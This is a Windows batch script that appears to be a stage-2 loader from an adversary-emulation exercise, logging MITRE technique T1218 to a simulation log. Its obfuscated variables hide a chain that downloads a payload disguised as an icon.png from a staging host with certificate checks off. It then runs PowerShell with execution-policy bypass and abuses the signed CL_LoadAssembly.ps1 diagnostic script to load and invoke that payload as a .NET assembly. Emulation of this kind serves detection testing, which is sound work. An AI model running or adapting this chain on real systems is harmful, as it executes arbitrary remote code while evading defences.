@echo off
setlocal enabledelayedexpansion

REM ---- Placeholder constant declarations (random-named SET vars) ----
SET a1B2c3D4=%APPDATA%\11987\dc73921f
SET eF5gH6iJ=5b63b499.txt
SET kL7mN8oP=https://10.0.0.49/stage/2/icon.png?11987-7
SET qR9sT0uV=ITZEL-S2B
SET wX1yZ2aB=11987
SET cD3eF4gH=7
SET iJ5kL6mN=%PUBLIC%\\macula-simulations.log

REM ---- Cache debug timestamp once at script start ----
SET tsvar=!DATE!/!TIME!

REM ---- Debug log start ----
echo [!tsvar!][DEBUG][!qR9sT0uV!][!wX1yZ2aB!]: stage2_start>> "!iJ5kL6mN!" 2>nul

REM ---- Heartbeat fetch (curl) ----
echo [!tsvar!][DEBUG][!qR9sT0uV!][!wX1yZ2aB!]: heartbeat_start>> "!iJ5kL6mN!" 2>nul
curl -k -s -o "!a1B2c3D4!\!eF5gH6iJ!" "!kL7mN8oP!"
if %errorlevel% neq 0 (
    echo [!tsvar!][DEBUG][!qR9sT0uV!][!wX1yZ2aB!]: heartbeat_fail>> "!iJ5kL6mN!" 2>nul
    goto :failure_cleanup
)
echo [!tsvar!][DEBUG][!qR9sT0uV!][!wX1yZ2aB!]: heartbeat_complete>> "!iJ5kL6mN!" 2>nul

REM ---- Position working directory ----
echo [!tsvar!][DEBUG][!qR9sT0uV!][!wX1yZ2aB!]: chdir_start>> "!iJ5kL6mN!" 2>nul
cd /d "!a1B2c3D4!" >nul 2>&1
echo [!tsvar!][DEBUG][!qR9sT0uV!][!wX1yZ2aB!]: chdir_result=!errorlevel!>> "!iJ5kL6mN!" 2>nul

REM ---- Invoke Stage 2 DLL via LOLBIN (PowerShell with CL_LoadAssembly) ----
echo [!tsvar!][DEBUG][!qR9sT0uV!][!wX1yZ2aB!]: powershell_start>> "!iJ5kL6mN!" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\CL_LoadAssembly.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; LoadAssemblyFromPath %APPDATA%\11987\dc73921f\5b63b499.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
set PS_EXIT=%errorlevel%
echo [!tsvar!][DEBUG][!qR9sT0uV!][!wX1yZ2aB!]: powershell_end=!PS_EXIT!>> "!iJ5kL6mN!" 2>nul

REM ---- Generate TTP log timestamp ----
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM ---- TTP log line for T1218 ----
if !PS_EXIT! equ 0 (
    echo [!timestamp!][TTP][!qR9sT0uV!][!wX1yZ2aB!]: T1218^|System Binary Proxy Execution=OK=[]>> "!iJ5kL6mN!" 2>&1
) else (
    echo [!timestamp!][TTP][!qR9sT0uV!][!wX1yZ2aB!]: T1218^|System Binary Proxy Execution=FAIL:exitcode=!PS_EXIT!>> "!iJ5kL6mN!" 2>&1
)

REM ---- Final debug log ----
echo [!tsvar!][DEBUG][!qR9sT0uV!][!wX1yZ2aB!]: stage2_complete>> "!iJ5kL6mN!" 2>nul

REM ---- Exit ----
exit /b 0

:failure_cleanup
echo [!tsvar!][DEBUG][!qR9sT0uV!][!wX1yZ2aB!]: heartbeat_fatal>> "!iJ5kL6mN!" 2>nul
exit /b 1
endlocal